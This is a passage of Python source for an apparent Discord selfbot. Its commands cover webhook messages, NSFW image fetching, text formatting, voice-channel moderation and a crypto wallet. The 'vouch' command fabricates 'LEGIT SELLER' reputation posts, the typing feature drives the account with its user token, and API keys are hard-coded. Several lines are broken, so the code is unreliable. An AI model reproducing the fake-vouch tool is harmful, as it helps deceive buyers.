            f"<:arrow:1554766539042062446> **Number of Channels:** `{channels}`\n"
        )
        await send(ctx,"Server Info",message)

    @commands.command(aliases=['memberscount','members','mc'])
    async def membercount(self,ctx):
        await ctx.message.delete()  
        guild = ctx.guild 
        member_count = guild.member_count
        await send(ctx,"Members",f"<:arrow:1554766539042062446>  **Server name : {guild.name}** \n<:arrow:1554766539042062446> **Members : {member_count}**")

    @commands.command(aliases=['boosts','bc'])
    async def boostcount(self,ctx):
        await ctx.message.delete()     
        guild = ctx.guild 
        boost_count = guild.premium_subscription_count 
        await send(ctx,"Boosts",f"<:arrow:1554766539042062446>  **Server name : {guild.name}** \n<:arrow:1554766539042062446>  **Boosts : {boost_count}**")    

    @commands.command(aliases=['sendweb','websend','sendwebhook'])
    async def webhooksend(self,ctx, webhook_url):
        await ctx.message.delete()
        ask_type = await ctx.send(">>> What type of message do you want to send from webhook ,Send option number of your choice\nOptions :\n\n  `1` = **Embed**\n `2` = **Normal**.")

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        try:
            type_msg = await self.bot.wait_for('message', check=check, timeout=60)
            msg_type = type_msg.content
            await ask_type.delete()
            
            await type_msg.delete()

            if msg_type == '1':
                ask_title = await ctx.send(">>> What should be the title of the embed?")
                title_msg = await self.bot.wait_for('message', check=check, timeout=60)
                title = title_msg.content
                await ask_title.delete()
                await title_msg.delete()
                ask_description = await ctx.send(">>> What will be the description of the embed?")
                description_msg = await self.bot.wait_for('message', check=check, timeout=60)
                description = description_msg.content
                await ask_description.delete()
                await description_msg.delete()
                ask_footer = await ctx.send(">>> What will be the footer of the embed?")
                footer_msg = await self.bot.wait_for('message', check=check, timeout=60)
                footer = footer_msg.content
                await ask_footer.delete()
                await footer_msg.delete()
                color_options = """
                What will be the color of the embed , send option number of your choice:\n\nOptions :\n
                `1` : Blue
                `2` : Green
                `3` : Red
                `4` : Yellow
                `5` : Purple
                `6` : Orange
                `7` : Dark Blue
                `8` : Dark Green
                `9` : Dark Red
                `10` : Black
                """
                ask_colour = await ctx.send(color_options)

                color_choices = {
                    '1': discord.Color.blue(),
                    '2': discord.Color.green(),
                    '3': discord.Color.red(),
                    '4': discord.Color.gold(),
                    '5': discord.Color.purple(),
                    '6': discord.Color.orange(),
                    '7': discord.Color.dark_blue(),
                    '8': discord.Color.dark_green(),
                    '9': discord.Color.dark_red(),
                    '10': discord.Color(0x000000) 
                }
                colour_msg = await self.bot.wait_for('message', check=check, timeout=60)
                colour_choice = colour_msg.content
                await ask_colour.delete()
                ()
                await colour_msg.delete()
                colour = color_choices.get(colour_choice, discord.Color.blue())

                embed = discord.Embed(title=title, description=description, color=colour)
                embed.set_footer(text=footer)
                await send_webhook(webhook_url, embed)

            elif msg_type == '2':
                ask_normal = await ctx.send(">>> What message do you want to send from your webook?")
                normal_msg = await self.bot.wait_for('message', check=check, timeout=60)
                message = normal_msg.content
                await ask_normal.delete()
                ()
                await normal_msg.delete()
                await send_webhook(webhook_url, message)

            else:
                await senderror(ctx,"Invalid","Invalid choice. Please type `1` for embed or `2` for normal message.","10")

        except asyncio.TimeoutError:
            await senderror(ctx,"Timeout","You took too long to respond! Please try again.")

class nsfw(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def fetch_and_download_image(self, ctx, api_url, default_filename):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            try:
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    if response.status == 200:
                        json_data = await response.json()
                        url = json_data.get("message") or json_data.get("url")
                        if url:
                            try:
                                async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as image_response:
                                    if image_response.status == 200:
                                        content_type = image_response.headers.get('Content-Type', '')
                                        extension = content_type.split("/")[1] if "image" in content_type else "png"
                                        if ";" in extension:
                                            extension = extension.split(";")[0]
                                        filename = f"{default_filename}.{extension}"

                                        image_data = await image_response.read()
                                        file = discord.File(io.BytesIO(image_data), filename=filename)
                                        try:
                                            await ctx.channel.send(file=file)
                                            return
                                        except Exception:
                                            pass
                            except Exception:
                                pass
                            await send(ctx, "NSFW", f"[Click here to view image]({url})", image=url)
                    else:
                        await senderror(ctx, "NSFW API Error", f"Endpoint returned status code `{response.status}`")
            except Exception as e:
                await senderror(ctx, "NSFW Error", f"Failed to fetch image: `{e}`")

    @commands.command()
    async def nsfw(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                        
            f"<a:nsfw:1554758930700435456> | **anal image** **:** **`{prefix}anal`**\n"
            f"<a:nsfw:1554758930700435456> | **hentai anal image** **:** **`{prefix}hanal`**\n"
            f"<a:nsfw:1554758930700435456> | **4K NSFW image** **:** **`{prefix}4k`**\n"
            f"<a:nsfw:1554758930700435456> | **NSFW GIF image** **:** **`{prefix}gif`**\n"
            f"<a:nsfw:1554758930700435456> | **pussy image** **:** **`{prefix}pussy`**\n"
            f"<a:nsfw:1554758930700435456> | **boobs image** **:** **`{prefix}boobs`**\n"
            f"<a:nsfw:1554758930700435456> | **ass image** **:** **`{prefix}ass`**\n"
            f"<a:nsfw:1554758930700435456> | **waifu image** **:** **`{prefix}waifu`**\n"
            f"<a:nsfw:1554758930700435456> | **hentai boobs image** **:** **`{prefix}hboobs`**\n"
            f"<a:nsfw:1554758930700435456> | **thigh image** **:** **`{prefix}thighs`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__NSFW Commands__<a:crown:1554756538445336626>", description)

    @commands.command()
    async def anal(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=anal", "anal")

    @commands.command()
    async def hanal(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=hanal", "hanal")

    @commands.command(name="4k")
    async def _4k(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=4k", "4k")

    @commands.command()
    async def gif(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=pgif", "nsfw")

    @commands.command()
    async def pussy(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=pussy", "pussy")

    @commands.command()
    async def boobs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=boobs", "boobs")

    @commands.command()
    async def ass(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=ass", "ass")

    @commands.command()
    async def hboobs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=hboobs", "hboobs")

    @commands.command(aliases=['thigh'])
    async def thighs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=thigh", "thighs")

    @commands.command()
    async def waifu(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://api.waifu.pics/nsfw/waifu", "waifu")

class other(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.tts_language = 'en'
        self.api_base_url = "https://discord.com/api/v9"
        self.typing_task = None       

    async def do_tts(self, message):
        """Convert text to speech and return as a file-like object."""
        f = io.BytesIO()
        tts = gTTS(text=message.lower(), lang=self.tts_language)
        tts.write_to_fp(f)
        f.seek(0)
        return f

    @commands.command()
    async def tts(self, ctx, *, message):
        """Convert text to speech."""
        await ctx.message.delete()
        buff = await self.do_tts(message)
        await ctx.send(file=discord.File(buff, f"spy.mp3"))

    @commands.command(aliases=['others'])
    async def other(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                        
            f"<a:hero:1554766032428867584> | **Text to speech** **:** **`{prefix}tts [message]`**\n"
            f"<a:hero:1554766032428867584> | **Create a server** **:** **`{prefix}crsrv <name>`**\n"           
            f"<a:hero:1554766032428867584> | **HTML Viewer** **:** **`{prefix}view <message_url>`**\n"   
            f"<a:hero:1554766032428867584> | **Get Screenshot** **:** **`{prefix}screenshot [website]`**\n"
            f"<a:hero:1554766032428867584> | **custom Qr code** **:** **`{prefix}qrcode [input]`**\n"
            f"<a:hero:1554766032428867584> | **Fake typing** **:** **`{prefix}faketyping`**\n"
            f"<a:hero:1554766032428867584> | **Stop Fake typing** **:** **`{prefix}stoptyping`**\n"
            f"<a:hero:1554766032428867584> | **Shiba profile** **:** **`{prefix}p [user]`**\n"
            f"<a:hero:1554766032428867584> | **Make vouch text** **:** **`{prefix}vouch`**\n"
            f"<a:hero:1554766032428867584> | **Chat-gpt** **:** **`{prefix}chatgpt <prompt>`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Other Commands__<a:crown:1554756538445336626>",  content)


    @commands.command(aliases=['ss', 'takess', 'showss'])
    async def screenshot(self, ctx, url):
        await ctx.message.delete()
        magkeyss = 'c0a417'
        endpoint = 'https://api.screenshotmachine.com'
        params = {
            'key': magkeyss,
            'url': url,
            'dimension': '1920x1080', 
            'format': 'png',
            'cacheLimit': '0',
            'timeout': '200'
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(endpoint, params=params) as response:
                    if response.status == 200:
                        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
                        temp_file.write(await response.read())
                        temp_file.close()
                        await ctx.send(file=discord.File(temp_file.name))
                        os.remove(temp_file.name)
                    else:
                        await ctx.send(f"Failed to capture screenshot: {response.status}",delete_after=30)
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")       

    @commands.command(aliases=['qr'])
    async def qrcode(self, ctx, input: str):
        await ctx.message.delete()
        try:
            qr = qrcode.QRCode(
                version=1,
                box_size=10, 
                border=5,
            )
            qr.add_data(input)
            qr.make(fit=True)
        
            img = qr.make_image(fill="black", back_color="white")
        
            buffer = BytesIO()
            img.save(buffer, "PNG")
            buffer.seek(0)
            
            file = discord.File(buffer, filename="ltc_qr.png")
            await ctx.send(content=f"<a:<a:party_pin:1378599582770008165>  **Here is the QR code for `{input}`**", file=file)
        
        except Exception as e:
            await ctx.send(f"An error occurred while generating the QR code: {e}")

    async def simulate_typing(self, channel_id):
        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }

        async with aiohttp.ClientSession(headers=headers) as session:
            while self.typing_task is not None:
                try:
                    async with session.post(f"{self.api_base_url}/channels/{channel_id}/typing") as response:
                        if response.status == 204:
                            pass 
                        else:
                            print(f"Failed to fake typing: {response.status}")
                    await asyncio.sleep(5) 
                except Exception as e:
                    print(f"Error while simulating typing: {e}")
                    break

    @commands.command()
    async def faketyping(self, ctx):
        await ctx.message.delete()        
        if self.typing_task:
            await ctx.send("<:arrow:1554766539042062446> Typing is already simulated.")
            return
        self.typing_task = asyncio.create_task(self.simulate_typing(ctx.channel.id))

    @commands.command()
    async def stoptyping(self, ctx):
        await ctx.message.delete()
        if self.typing_task:
            self.typing_task.cancel()
            self.typing_task = None
            await ctx.send("<:arrow:1554766539042062446> Stopped simulating typing.")
        else:
            await ctx.send("<:arrow:1554766539042062446> No typing simulation is running.")

    @commands.command()
    async def vouch(self,ctx,payment_method: str ,price_with_currency,*,product_with_quantity):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        vouch_server = config.get("vouch_server")        
        await ctx.send(f"+rep {ctx.author.id} | LEGIT SELLER | GOT {product_with_quantity} for {price_with_currency} {payment_method} • TYSM")
        await ctx.send(vouch_server)    

    @commands.command(aliases=['gpt'])
    async def chatgpt(self, ctx, *, prompt: str):
        await ctx.message.delete()
        KASTG_API_KEY = "Kastg_Eu6jVbs1eGAqLNsVOJVF_free"   
        p = prompt.replace(" ","+")     
        url = f"https://api.kastg.xyz/api/ai/chatgptV4?prompt={p}&key={KASTG_API_KEY}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                ai_response = data.get("result", [{}])[0].get("response")
                await send(ctx,"Chat GPT" ,f"<:arrow:1554766539042062446> **prompt** : {prompt}\n<:arrow:1554766539042062446> **ChatGpt** : {ai_response}") 
            else:
                await ctx.send(f"Error: {response.status_code} - {response.text}")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")            

class text(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def txt(self, ctx, *, content: str):
        await ctx.message.delete()
        txt_file = f"{selfbot_name} .txt"
        async with aiofiles.open(txt_file, 'w', encoding='utf-8') as f:
            await f.write(content)
        await ctx.send(file=discord.File(txt_file))
        os.remove(txt_file)

    @commands.command()
    async def text(self, ctx):
        try:
            await ctx.message.delete()
        except discord.NotFound:
            pass 
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"             
            f"<a:text_:1554759237807382551> | **Create txt file** **:** **`{prefix}txt [content]`**\n"
            f"<a:text_:1554759237807382551> | **red Text** **:** **`{prefix}red [content]`**\n"
            f"<a:text_:1554759237807382551> | **green text** **:** **`{prefix}green [content]`**\n"
            f"<a:text_:1554759237807382551> | **dark blue text** **:** **`{prefix}darkblue [content]`**\n"
            f"<a:text_:1554759237807382551> | **blue text** **:** **`{prefix}blue [content]`**\n"
            f"<a:text_:1554759237807382551> | **purple text** **:** **`{prefix}purple [content]`**\n"
            f"<a:text_:1554759237807382551> | **Strikethrough content** **:** **`{prefix}strike [content]`**\n"
            f"<a:text_:1554759237807382551> | **shrug emoticon** **:** **`{prefix}shrug`**\n"
            f"<a:text_:1554759237807382551> | **table flip** **:** **`{prefix}tableflip`**\n"
            f"<a:text_:1554759237807382551> | **bold text** **:** **`{prefix}bold [content]`**\n"
            f"<a:text_:1554759237807382551> | **italic text** **:** **`{prefix}italic [content]`**\n"
            f"<a:text_:1554759237807382551> | **large text** **:** **`{prefix}large [content]`**\n"
            f"<a:text_:1554759237807382551> | **Capital letters content** **:** **`{prefix}capital [content]`**\n"
            f"<a:text_:1554759237807382551> | **Small letters Content** **:** **`{prefix}small [content]`**\n"                        
            f"<a:text_:1554759237807382551> | **little text** **:** **`{prefix}little [content]`**\n"
            f"<a:text_:1554759237807382551> | **big text** **:** **`{prefix}big [content]`**\n"
            f"<a:text_:1554759237807382551> | **spoiler text** **:** **`{prefix}spoiler [content]`**\n"
            f"<a:text_:1554759237807382551> | **Underline content** **:** **`{prefix}underline [content]`**\n"
            f"<a:text_:1554759237807382551> | **Reverse the content** **:** **`{prefix}reverse [content]`**\n"
            f"<a:text_:1554759237807382551> | **Convert text to emojis** **:** **`{prefix}emojify [content]`**\n"
            f"<a:text_:1554759237807382551> | **Quote the content** **:** **`{prefix}quote [content]`**\n"
            f"<a:text_:1554759237807382551> | **Format content as code** **:** **`{prefix}codeblock [content]`**\n"
            f"<a:text_:1554759237807382551> | **Flip the text** **:** **`{prefix}flip [content]`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__Text Commands__<a:crown:1554756538445336626>", description)

    @commands.command(aliases=['cap','capitalize','capital'])
    async def caps(ctx, *, message: str):
        await ctx.send(message.upper())

    @commands.command()
    async def small(ctx, *, message: str):
        await ctx.send(message.lower())

    @commands.command()
    async def red(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"- {line}" for line in content.splitlines()])
        await ctx.send(f"```diff\n{formatted_content}\n```")

    @commands.command()
    async def green(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"+ {line}" for line in content.splitlines()])
        await ctx.send(f"```diff\n{formatted_content}\n```")

    @commands.command()
    async def darkblue(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"[{line}]" for line in content.splitlines()])
        await ctx.send(f"```ini\n{formatted_content}\n```")

    @commands.command()
    async def blue(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"[{line}]" for line in content.splitlines()])
        await ctx.send(f"```css\n{formatted_content}\n```")

    @commands.command()
    async def purple(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f".{line}" for line in content.splitlines()])
        await ctx.send(f"```asciidoc\n{formatted_content}\n```")

    @commands.command(aliases=['strike'])
    async def strikethrough(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"~~{line}~~" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def shrug(self, ctx):
        await ctx.message.delete()
        await ctx.send("¯\\_(ツ)_/¯")

    @commands.command()
    async def tableflip(self, ctx):
        await ctx.message.delete()
        await ctx.send("(╯°□°）╯︵ ┻━┻")

    @commands.command()
    async def bold(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"**{line}**" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def italic(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"*{line}*" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def large(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"# {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command(aliases=['lil'])
    async def little(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"-# {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def big(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"## {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def spoiler(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"||{line}||" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def underline(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"__{line}__" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def reverse(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([line[::-1] for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def emojify(self, ctx, *, content: str):
        await ctx.message.delete()
        emojis = []
        for char in content:
            if char.isalpha():
                emoji = f":regional_indicator_{char.lower()}:"
                emojis.append(emoji)
            elif char.isspace():
                emojis.append(" ")
            else:
                emojis.append(char)

        emojified_content = ''.join(emojis)
        await ctx.send(f"{emojified_content}")

    @commands.command()
    async def quote(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"> {line}" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def codeblock(self, ctx, *, content: str):
        await ctx.message.delete()
        formatted_content = "\n".join([f"```{line}```" for line in content.splitlines()])
        await ctx.send(f"{formatted_content}")

    @commands.command()
    async def flip(self, ctx, *, content: str):
        await ctx.message.delete()
        flipped_content = self.flip_text(content)
        await ctx.send(f"{flipped_content}")

    def flip_text(self, text: str) -> str:
        flip_mapping = {
                            'a' : 'ɐ', 
                            'b' : 'q', 
                            'c' : 'ɔ', 
                            'd' : 'p', 
                            'e' : 'ǝ', 
                            'f' : 'ɟ', 
                            'g' : 'ƃ', 
                            'h' : 'ɥ', 
                            'i' : 'ᴉ', 
                            'j' : 'ɾ', 
                            'k' : 'ʞ', 
                            'l' : 'ʃ', 
                            'm' : 'ɯ', 
                            'n' : 'u', 
                            'o' : 'o', 
                            'p' : 'd', 
                            'q' : 'b', 
                            'r' : 'ɹ', 
                            's' : 's', 
                            't' : 'ʇ', 
                            'u' : 'n', 
                            'v' : 'ʌ', 
                            'w' : 'ʍ', 
                            'x' : 'x', 
                            'y' : 'ʎ', 
                            'z' : 'z',
                            ' ' : ' '
        }
        return ''.join(flip_mapping.get(char, char) for char in text)

tasks_dict = {}



class vc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def vckick(self, ctx, user: discord.Member):
        await ctx.message.delete()
        if user.voice and user.voice.channel:
            await user.move_to(None)
            await send(ctx, "VC Kick", f"<:arrow:1554766539042062446> User {user.name} has been kicked from the VC.")

    @commands.command()
    async def vcmoveall(self, ctx, channel1_id: int, channel2_id: int):
        await ctx.message.delete()
        channel1 = self.bot.get_channel(channel1_id)
        channel2 = self.bot.get_channel(channel2_id)
        if isinstance(channel1, discord.VoiceChannel) and isinstance(channel2, discord.VoiceChannel):
            members = channel1.members
            for member in members:
                await member.move_to(channel2)
            await send(ctx, "VC Move All", f"<:arrow:1554766539042062446> Moved all users from {channel1.name} to {channel2.name}.")

    @commands.command()
    async def vcmute(self, ctx, user: discord.Member):
        await ctx.message.delete()
        if user.voice and user.voice.channel:
            await user.edit(mute=True)
            await send(ctx, "VC Mute", f"<:arrow:1554766539042062446> {user.name} has been muted.")

    @commands.command()
    async def vcunmute(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(mute=False)
            await send(ctx, "VC Unmute", f"<:arrow:1554766539042062446> {member.name} has been unmuted.")

    @commands.command()
    async def vcdeafen(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(deafen=True)
            await send(ctx, "VC Deafen", f"<:arrow:1554766539042062446> {member.name} has been deafened.")

    @commands.command()
    async def vcundeafen(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.edit(deafen=False)
            await send(ctx, "VC Undeafen", f"<:arrow:1554766539042062446> {member.name} has been undeafened.")

    @commands.command()
    async def vcmove(self, ctx, member: discord.Member, channel: discord.VoiceChannel):
        await ctx.message.delete()
        if ctx.author.voice and member.voice and member.voice.channel == ctx.author.voice.channel:
            await member.move_to(channel)
            await send(ctx, "VC Move", f"<:arrow:1554766539042062446> Moved {member.name} to {channel.name}.")

    @commands.command(aliases=['247', 'joinvc'])
    async def vcjoin(self, ctx, channel: discord.VoiceChannel):
        await ctx.message.delete()
        if ctx.voice_client:  
            await ctx.voice_client.move_to(channel)
            await send(ctx, "VC Join", f"<:arrow:1554766539042062446> Successfully moved to VC: {channel.name}.","30")
        else:
            await channel.connect()
            await send(ctx, "VC Join", f"<:arrow:1554766539042062446> Successfully joined VC: {channel.name}.","30")

    @commands.command(aliases=['leavevc'])
    async def vcleave(self, ctx):
        await ctx.message.delete()
        player = ctx.voice_client
        if not player:
            await send(ctx, "VC Leave", f"<:arrow:1554766539042062446> Bot is not in a VC.","30")
            return
        channel_name = player.channel.name
        await player.disconnect()
        await send(ctx, "VC Leave", f"<:arrow:1554766539042062446> Successfully left VC: {channel_name}.","30")

    @commands.command(aliases=['vc'])
    async def voicechat(self, ctx):
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()
        content = (
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"
            f"<:discord:1554757014406823988> **`[REQUIRED] | <OPTIONAL>`** <a:staff:1554757404972032060>\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>\n"                
            f"<a:FakeNitroEmoji:1554762881260720158> | **Kick from VC** **:** **`{prefix}vckick <user>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Move from VCs** **:** **`{prefix}vcmoveall <channel1_id> <channel2_id>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Mute in VC** **:** **`{prefix}vcmute <user>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Unmute in VC** **:** **`{prefix}vcunmute <user>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Deafen in VC** **:** **`{prefix}vcdeafen <user>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Undeafen in VC** **:** **`{prefix}vcundeafen <user>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Move user to VC** **:** **`{prefix}vcmove <user> <channel>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Join VC 247** **:** **`{prefix}vcjoin <channel>`**\n"
            f"<a:FakeNitroEmoji:1554762881260720158> | **Leave VC** **:** **`{prefix}vcleave`**\n"
            f"<a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331><a:WLines:1554756786332897331>"
        )
        await send(ctx, "<:rocket1:1554756297143095346>__VC Commands__<a:crown:1554756538445336626>", content)

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

class Wallet(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.TATUM_API = config.get('tatum_api_key')       
        self.private_key = config.get('private_key')

    def get_usd_to_inr_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['INR']
            else:
                return None
        except Exception as e:
            print(f"Error fetching exchange rate: {e}")
            return None

    def get_usd_to_eur_rate(self):
        try:
            response = requests.get('https://api.exchangerate-api.com/v4/latest/USD')
            if response.status_code == 200:
                data = response.json()
                return data['rates']['EUR']
            else:
                return None
        except Exception as e:
            print(f"Error fetching exchange rate: {e}")
            return None

    @commands.command()
    async def wallet(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
